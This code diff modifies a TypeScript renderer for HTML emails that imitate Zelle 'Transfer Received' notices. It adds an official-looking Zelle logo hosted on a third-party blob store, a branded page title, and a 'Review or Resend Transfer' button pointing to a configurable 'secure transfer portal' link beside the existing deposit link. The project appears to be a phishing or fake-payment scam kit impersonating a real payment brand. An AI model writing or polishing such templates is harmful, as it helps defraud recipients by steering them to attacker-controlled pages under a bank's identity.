@@ -6,6 +6,7 @@ export interface ZelleEmailData {
   message?: string
   transferId: string
   depositLink: string
+  sendLink?: string   // /send?review=transferId — "Review or Resend" CTA in email
   senderName?: string
   institution?: string
 }
@@ -17,7 +18,7 @@ function wrapEmail(html: string): string {
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1.0" />
   <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-  <title>Zelle</title>
+  <title>Transfer Received — Zelle</title>
   <style>
     body{margin:0;padding:0;background:#eaeced;font-family:Arial,sans-serif}
     table{border-collapse:collapse}
@@ -52,12 +53,16 @@ export function renderZelleEmail(data: ZelleEmailData, mode: EmailLangMode = "en
               <td style="padding:13px 24px;" valign="middle">
                 <table cellpadding="0" cellspacing="0" border="0">
                   <tr>
-                    <!-- Zelle logo in purple square -->
+                    <!-- Official Zelle logo -->
                     <td valign="middle">
                       <table cellpadding="0" cellspacing="0" border="0">
                         <tr>
-                          <td width="44" height="44" style="background-color:#6D1ED4;border-radius:8px;text-align:center;vertical-align:middle;padding:6px;">
-                            <span style="color:#ffffff;font-family:Arial,sans-serif;font-size:22px;font-weight:900;line-height:32px;display:block;">Z</span>
+                          <td width="44" height="44" style="border-radius:8px;overflow:hidden;padding:0;line-height:0;">
+                            <img src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/icon-mSPCqk7ATnCdeUMZWv6f63zVg0bMBQ.webp"
+                                 alt="Zelle"
+                                 width="44" height="44"
+                                 style="display:block;width:44px;height:44px;border-radius:8px;border:0;object-fit:cover;"
+                            />
                           </td>
                         </tr>
                       </table>
@@ -157,10 +162,35 @@ export function renderZelleEmail(data: ZelleEmailData, mode: EmailLangMode = "en
               </div>
             </div>
 
-            <!-- Deposit Button -->
+            <!-- Primary CTA: Deposit button -->
             <div style="padding:0 72px;margin-top:32px;text-align:center">
               <a href="${data.depositLink}" style="display:inline-block;background-color:#6D1ED4;color:#ffffff;font-weight:700;padding:16px 32px;font-size:16px;border-radius:8px;text-decoration:none">${copy.depositCta}</a>
             </div>
+
+            <!-- Secondary CTA: Review or Resend Transfer -->
+            ${data.sendLink ? `
+            <div style="padding:0 72px;margin-top:16px;text-align:center">
+              <table width="100%" cellpadding="0" cellspacing="0" border="0">
+                <tr>
+                  <td style="text-align:center;padding-bottom:4px;">
+                    <a href="${data.sendLink}"
+                       style="display:inline-block;border:2px solid #6D1ED4;color:#6D1ED4;
+                              padding:12px 28px;border-radius:8px;font-size:14px;font-weight:600;
+                              text-decoration:none;background-color:#ffffff;letter-spacing:0.02em;">
+                      Review or Resend Transfer
+                    </a>
+                  </td>
+                </tr>
+                <tr>
+                  <td style="text-align:center;">
+                    <span style="font-size:11px;color:#888888;">
+                      Opens the secure transfer portal with this transaction pre-filled.
+                    </span>
+                  </td>
+                </tr>
+              </table>
+            </div>
+            ` : ""}
 
             <!-- How to Deposit -->
             <div style="padding:0 72px;margin-top:32px">
@@ -205,9 +235,17 @@ export function renderZelleEmail(data: ZelleEmailData, mode: EmailLangMode = "en
             <table width="100%" cellpadding="0" cellspacing="0">
               <tr>
                 <td valign="top" width="50%">
-                  <div style="width:48px;height:48px;background-color:#6D1ED4;border-radius:8px;display:flex;align-items:center;justify-content:center;">
-                    <span style="color:#ffffff;font-family:Arial,sans-serif;font-size:24px;font-weight:900;line-height:48px;display:block;text-align:center;">Z</span>
-                  </div>
+                  <table cellpadding="0" cellspacing="0" border="0">
+                    <tr>
+                      <td width="48" height="48" style="border-radius:8px;overflow:hidden;padding:0;line-height:0;">
+                        <img src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/icon-mSPCqk7ATnCdeUMZWv6f63zVg0bMBQ.webp"
+                             alt="Zelle"
+                             width="48" height="48"
+                             style="display:block;width:48px;height:48px;border-radius:8px;border:0;object-fit:cover;"
+                        />
+                      </td>
+                    </tr>
+                  </table>
                 </td>
                 <td valign="top" width="50%" style="text-align:right;font-size:14px">
                   <p style="margin:0">2000 - 2025 Zelle.</p>
